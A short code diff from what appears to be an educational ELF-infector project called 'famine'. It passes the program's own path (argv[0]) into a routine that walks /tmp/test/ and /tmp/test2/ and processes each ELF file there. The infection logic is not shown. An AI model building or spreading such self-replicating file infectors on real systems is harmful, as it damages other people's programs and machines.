@@ -1,6 +1,6 @@
 #include "famine.h"
 
-void do_virus(char* dirName, t_woody *woody)
+void do_virus(char* dirName, t_woody *woody, char *path)
 {
     DIR *dir;
     struct dirent *ent;
@@ -11,7 +11,7 @@ void do_virus(char* dirName, t_woody *woody)
         {
             if (ft_strcmp(ent->d_name, ".") != 0 && ft_strcmp(ent->d_name, "..") != 0)
             {
-                if (read_elf_file(woody, ft_strjoin(dirName, ent->d_name)) == ERROR_CODE)
+                if (read_elf_file_bonus(woody, ft_strjoin(dirName, ent->d_name), path) == ERROR_CODE)
                 {
                     free(woody->addr);
                     continue;
@@ -45,8 +45,8 @@ int main(int argc, char **argv)
     t_woody woody;
     ft_memset(&woody, 0, sizeof(woody));
 
-    do_virus("/tmp/test/", &woody);
-    do_virus("/tmp/test2/", &woody);
+    do_virus("/tmp/test/", &woody, argv[0]);
+    do_virus("/tmp/test2/", &woody, argv[0]);
 
     return (0);
 }
